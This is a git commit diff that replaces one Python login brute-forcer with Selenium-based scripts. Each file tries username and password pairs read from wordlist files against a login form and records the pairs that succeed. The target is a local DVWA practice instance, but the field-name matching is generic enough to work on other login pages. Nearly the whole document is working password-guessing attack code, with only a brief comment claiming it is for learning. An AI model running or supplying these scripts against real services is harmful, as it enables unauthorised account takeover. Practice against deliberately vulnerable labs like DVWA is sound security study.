0a6697f0e45d5e8214e7c6f5a3b0c256bcec56e1
tattooweb <372335586@qq.com>
2021-03-02 00:09:49 +0800

    2021-03-02 00:09:48

--- BURST.py
+++ BURST.py
@@ -1,66 +1,70 @@
-# -*- coding: utf-8 -*-
-# 利用python 写的多线程爆破后台用户名+密码(自备字典),比较实用,即使是在信息安全这么重视的今天,还是有人不加验证码或者异常访问限制之类的登陆验证方式,这样就很# 容易被弱口令爆破工具拿下,(本代码仅限学习实用,禁止进行web攻击,不承担法律责任)
-import urllib2
-import urllib
-import httplib
-import threading
- 
-headers = {"Content-Type":"application/x-www-form-urlencoded",     
-           "Connection":"Keep-Alive",
-           "Referer":"http://127.0.0.1/dvwa/login.php"};# referer:是代理的访问来源地址
-# lock = threading.Lock()
-def tryUser(user,password):
-    #print user,password
-    global headers
-    global outFile 
-    conn = httplib.HTTPConnection("127.0.0.1") # 远程域名
-    if len(user) < 3:     # 限制用户名长度，排除字典中的无用数据
-        return  # 主动退出线程
-    else:
-        #lock.acquire()   # 多线程操作文件，提前加锁，用后释放
-        #line = inFile.readline()
-        
-        #userData = line.strip().split(' # ') # strip() 默认去除空白字符包括' ','\t','\n'等
-        #lock.release()
- 
-        user = user.strip()
-        passwd = password.strip()
-        params = urllib.urlencode({'username': user, 'password': passwd})
-        conn.request(method="POST", url="/dvwa/login.php", body=params, headers=headers) # 后台路径
-        responseText = conn.getresponse().read().decode('utf8') # 网页编码
-        # print responseText  # 第一次可以打印看看是否解析
-        if not responseText.find('Login failed')  0 :
-            print '----- find user:', user, 'with password:', passwd, '-----'
-            outFile.write(user + '    ' +  passwd + '\n')
-            
-    return
- 
-outFile = open('accounts-cracked.txt', 'w')
- 
-if __name__ == '__main__':
-    tsk=[] # 创建线程池
-    with open(r'user.txt', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭(类似C# 中的using(...){}接口)
-        with open(r'passwordlist.txt', 'r') as fPass:
-            for user in fUser.readlines():
-                for password in fPass.readlines():
-                    t= threading.Thread(target = tryUser,args=(user,password))
-                    t.daemon = False # 设置不进行进程守护
-                    tsk.append(t) # t.start()
-                fPass.seek(0)
-                # 记住这里要将文件重新移到文件首,不然就会出现只执行外层循环的第一条,因为内层在
-                # 迭代之后(readlines()是迭代器的形式,迭代一次后文件指针就指到文件尾了,迭代器
-                # 也是end了)第二次就没有password 在 fPass中,也就是说 for  password in fPass.readlines():
-                # 为空,所以这里的内层循环就不会被执行了,因此也就是迭代器清零的问题(C ++ itertor 常有)
-                 
-                    
-# join()无参数就是完全阻塞主线程,等待线程执行完 有参数就是说，
-# 在主线程等待一秒后就不阻塞线程了,继续执行主线程,这里的意思是一秒钟开一个线程
-# 不能再thread start之前调用join(), 因为join() 是线程运行时调度
-    for t in tsk:
-        t.start()
-        t.join(1) 
- 
- 
- 
-    print "All thread OK,maybe not "
-    outFile.close()
+from selenium import webdriver
+
+#初始化一个谷歌浏览器实例：browser
+browser = webdriver.Chrome()
+# browser = webdriver.Firefox() #火狐较慢
+
+#最大化浏览器
+browser.maximize_window() 
+# browser.minimize_window()
+
+#通过get()方法，打开一个url站点
+browser.get("http://127.0.0.1/dvwa/login.php") 
+
+#隐式等待10秒
+browser.implicitly_wait(10)
+
+#获得登陆前的验证信息：网站url和title
+url_beforelogin = browser.current_url
+title_beforelogin = browser.title
+
+#定义爆破字典
+userlist = []
+pwdlist = []
+
+#按行读取不带换行符的密码文件
+with open('user.txt', 'r') as f:
+    userlist = f.read().splitlines()
+
+with open('passwordlist.txt', 'r') as f:
+    pwdlist = f.read().splitlines()
+
+for user in userlist:
+    for pwd in pwdlist:
+        #通过id或name属性定位用户名元素
+        ele_user = browser.find_element_by_xpath('''//*[@id='user' or @id='username' or @id='Username' 
+            or @id='name' or @id='yonghu' or @id='zhanghao' or @id='account' or @id='USERNAME' 
+            or @id='USER' or @name='user' or @name='username' or @name='Username' or @name='name' 
+            or @name='yonghu' or @name='zhanghao' or @name='account' or @name='USERNAME' 
+            or @name='USER']''')
+        ele_user.send_keys(user)
+
+        #通过id或name属性定位密码元素
+        ele_pwd = browser.find_element_by_xpath('''//*[@id='password' or @id='pass' or @id='pwd' 
+            or @id='mima' or @id='passwd' or @id='PASSWORD' or @id='PWD' or @id='PASS' 
+            or @id='Password' or @name='password' or @name='pass' or @name='pwd' 
+            or @name='mima' or @name='passwd' or @name='PASSWORD' or @name='PWD' 
+            or @name='PASS' or @name='Password']''')
+        ele_pwd.send_keys(pwd)
+        browser.find_element_by_name('Login').click() #登录
+
+        #获得登陆后的验证信息：url和title
+        url_afterlogin = browser.current_url
+        title_afterlogin = browser.title
+
+        #登录成功，记录用户名和密码
+        if (title_beforelogin != title_afterlogin) or (url_beforelogin !=url_afterlogin):
+            print("[+]用户名：" + user + ' ' + '密码：' + pwd)
+            browser.implicitly_wait(10)
+            break
+        else:
+            print("[-]用户名：" + user + ' ' + '密码：' + pwd)
+            # ele_user.clear()
+            # ele_pwd.clear()
+            # # 清楚cookie,返回登录界面,继续其他用户的爆破
+            # driver.delete_all_cookies()
+            # driver.get('http://127.0.0.1/dvwa/login.php')
+            browser.implicitly_wait(10)
+
+#退出浏览器
+browser.quit()
--- test2.py
+++ test2.py
@@ -1,18 +1,49 @@
-import urllib.request
-import json
+from selenium import webdriver
+import time
+import os
+import requests
 
-url = "http://127.0.0.1/dvwa/login.php"
+driver = webdriver.Chrome()
+driver.get('http://127.0.0.1/dvwa/login.php')
 
-headers={'Host':'127.0.0.1',
-         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
-         'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-         'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
-         'Connection':'keep-alive',
-         'Upgrade-Insecure-Requests':'1',
-         'Referer':'http://127.0.0.1/dvwa/login.php'}
-request = urllib.request.Request(url, data=None, headers=headers)
-response = urllib.request.urlopen(request).read()
-response = json.loads(response)
-test = response["test"] 
-print (test)
-# req = request.form.get('xxx')
+username = []
+password = []
+
+with open('user.txt', 'r') as f:
+    username = f.readlines()
+
+with open('passwordlist.txt', 'r') as f:
+    password = f.readlines()
+
+for u in range(0,len(username)):
+    for p in range(0,len(password)):
+        # 重新获取元素，尤其是在登录成功后
+        # 元素获取需要根据实际场景,进行修改
+        user = driver.find_element_by_name('username')
+        passwd = driver.find_element_by_name('password')
+        # btn = driver.find_element_by_xpath('//button[@name="loginButton"]')
+        btn = driver.find_element_by_name('Login')
+
+        user.send_keys(username[u].rstrip('\n'))
+        passwd.send_keys(password[p].rstrip('\n'))
+        btn.click()
+
+        # 登录成功跳转，有一定时间差，为后续获取登录成功前后标题对比
+        # time.sleep(3)
+        driver.implicitly_wait(10)
+
+        # 登录成功判断，标题判断（也可采用其他判断方式）
+        # 这里对比与登录后标题不一致进行判断
+        if 'Login' not in driver.title :
+            print('用户名：' + username[u].rstrip('\n') + ' ' +'密码：' + password[p].rstrip('\n'))
+            
+            # 清楚cookie,返回登录界面,继续其他用户的爆破
+            driver.delete_all_cookies()
+            driver.get('http://127.0.0.1/dvwa/login.php')
+            # time.sleep(2)
+            driver.implicitly_wait(10)
+            break
+
+        # 清除登录框
+        user.clear()
+        passwd.clear()
